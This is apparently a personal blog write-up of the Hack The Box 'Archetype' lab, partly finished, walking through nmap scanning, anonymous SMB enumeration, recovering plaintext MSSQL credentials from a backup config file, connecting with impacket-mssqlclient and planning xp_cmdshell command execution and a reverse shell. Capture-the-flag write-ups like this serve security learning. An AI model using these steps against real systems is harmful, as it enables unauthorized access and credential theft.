---
title: 'HTB Starting Point - Tier 2'
description: 'Hack the Box Starting Point'
pubDate: 'Dec 13 2024'
heroImage: '/blog-placeholder-1.jpg'
---

Topics covered:  
* XXE
* IDOR
* Log4J
* Cookie manipulation
* PrivEsc
* LXD for privileged filesystem access


## Archetype
*MSSQL, SMB, PS1, RCE*

**Task 1**  
Which TCP port is hosting a database server?

```bash
kali$ nmap -sV $TARGET --min-rate=2000

PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

Looks like the answer is 1433.

From the list above:
* 135: RPC. (Low level and insecure network comms to invoke a remote procedure)
* 139: Typically used by SMB to communicate with old devices. This is for SMB over NBT (NetBIOS over TCP/IP)
* 445: SMB server

This [stack overflow answer](https://superuser.com/a/694480) provides a great summary of the relationship between SMB and NetBIOS. In short: SMB and NetBIOS are different protocols, however to support legacy Windows systems, SMB can use the NetBIOS API to talk with older machines. See the diagram in the link.


**Task 2**  
What is the name of the non-Administrative share available over SMB?

```bash
kali$ smbclient -L $TARGET -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

Looks like it is `backups`. (N.b. admin shares typically have a `$` suffix)


**Task 3**  
What is the password identified in the file on the SMB share?

```bash
kali$ smbclient //$TARGET/backups

smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020
		5056511 blocks of size 4096. 2522480 blocks available

smb: \> print prod.dtsConfig
NT_STATUS_ACCESS_DENIED opening remote file prod.dtsConfig

smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
```

No permissions were allowed to print the file, however I could use get instead. By reading the file contents, we find this spicy connection string with these credentials `ARCHETYPE\sql_svc; M3g4c0rp123`

```xml
 <ConfiguredValue>
    Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;
</ConfiguredValue>
 ```


**Task 4**  
What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

Impacket is designed to deal with network packets, "providing low-level programmatic access". Looking through the [repo](https://github.com/fortra/impacket/tree/master), I can see `mssqlshell.py` and `mssqlattack.py` example files. The attack utilises the shell script. (N.b. These are classes, not scripts! :facepalm:). Looks like the script I'm after is `mssqlclient`. In Kali, this is already installed and on the path. It can be executed by `impacket-mssqlclient`.

```bash
kali$ impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@$TARGET -windows-auth
```

**Task 5**  
What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

[`xp_cmdshell`](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16)


**Task 6**  
What script can be used in order to search possible paths to escalate privileges on Windows hosts?

`winpeas` apparently :shrug:


**Task 7**  
What file contains the administrator's password?

At this point, I can execute commands via `xp_cmdshell`. It seems pertinent to create a reverse shell. This will allow us a more stable connection adn remove the need to type `xp_cmdshell` on every line.

*From a quick geeze through the writeup, it looks like there is a common pattern to download certain executables to the target machine - this includes things like nc.exe for the reverse shell, and winpeas for the privesc. We'll come back to the next time*

**Task 8**  
Submit user flag


**Task 9**  
Submit root flag
